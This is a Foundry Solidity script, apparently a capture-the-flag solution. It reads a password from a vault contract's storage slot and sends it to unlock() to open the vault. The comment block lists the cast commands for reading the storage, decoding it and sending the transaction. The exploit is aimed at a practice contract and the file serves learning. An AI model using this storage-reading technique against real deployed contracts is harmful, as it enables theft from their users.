// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

// Vault contract address: "0xd89904Ab83DF34e6a27217AeCC959B3fA989c4E8"

interface IVault {
    function locked() external;

    function unlock(bytes32) external;
}

contract TriggerAttack is Script {
    IVault public vault;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);
        vault = IVault(0xd89904Ab83DF34e6a27217AeCC959B3fA989c4E8);
        vm.stopBroadcast();

        vm.startBroadcast(privateKey);
        vault.unlock(
            0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        );
        vm.stopBroadcast();
    }
}

// eth_getStorageAt

// 0x412076657279207374726f6e67207365637265742070617373776f7264203a29

// A very strong secret password :)

/*
Looking at EVM Storage

1. The following command will fetch the data stored on slot 1 of the 0xcontractAddreSsE contract:
```
cast storage 0xcontractAddreSsE 1 --rpc-url $RPC_URL
```

***Note:** the '1' after the address is the storage position we are looking into -- 1 is the second storage*

2. You can read the data by converting it from byte32 to ASCII.
```
cast --to-ascii 0x412076ReturnedByte32Data6f7264203a29
```

3. Make a function call to unlock() passing the received password as bytes32

```
cast send 0xcontractAddreSsE "unlock(bytes32)" "0x412076ReturnedByte32Data6f7264203a29" --private-key $PRIVATE_KEY --rpc-url $RPC_URL

```

*/
